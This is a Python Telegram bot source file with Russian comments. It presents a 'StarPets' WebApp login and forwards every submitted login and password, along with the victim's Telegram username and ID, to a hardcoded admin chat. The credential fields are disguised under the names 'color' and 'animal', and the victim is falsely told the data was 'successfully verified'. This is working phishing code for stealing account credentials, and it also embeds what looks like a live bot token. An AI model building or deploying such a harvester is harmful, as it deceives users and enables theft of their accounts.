import asyncio
import json
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import WebAppInfo
from aiogram.utils.keyboard import InlineKeyboardBuilder

# === НАСТРОЙКИ ===
BOT_TOKEN = "8068075516:AAFGT1zbPQYa2zbne7e576vjgdeF4Pv4oLY"
ADMIN_CHAT_ID = 7225974704
WEBAPP_URL = "https://sp-web-dun.vercel.app/site/index.html"
# =================

bot = Bot(BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="Открыть StarPets", web_app=WebAppInfo(url=WEBAPP_URL))

    await message.answer_photo(
        photo=types.FSInputFile("assets/1.png"),
        caption="Нажми кнопку ниже, чтобы войти через WebApp",
        reply_markup=kb.as_markup(),
    )

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    raw_data = message.web_app_data.data
    u = message.from_user
    
    try:
        data = json.loads(raw_data)
        # Бот ожидает, что сайт пришлет "type": "submit"
        if data.get("type") == "submit":
            fields = data.get("fields", {})
            # Извлекаем логин и пароль (или color/animal, как было в коде)
            login = fields.get("color") or fields.get("login")
            password = fields.get("animal") or fields.get("password")

            report = (
                f"📥 <b>Получены данные!</b>\n"
                f"Пользователь: @{u.username} (ID: {u.id})\n"
                f"Логин: <code>{login}</code>\n"
                f"Пароль: <code>{password}</code>"
            )
            await bot.send_message(ADMIN_CHAT_ID, report, parse_mode="HTML")
            await message.answer("✅ Данные успешно проверены!")
    except Exception as e:
        await bot.send_message(ADMIN_CHAT_ID, f"Ошибка парсинга: {e}\nДанные: {raw_data}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
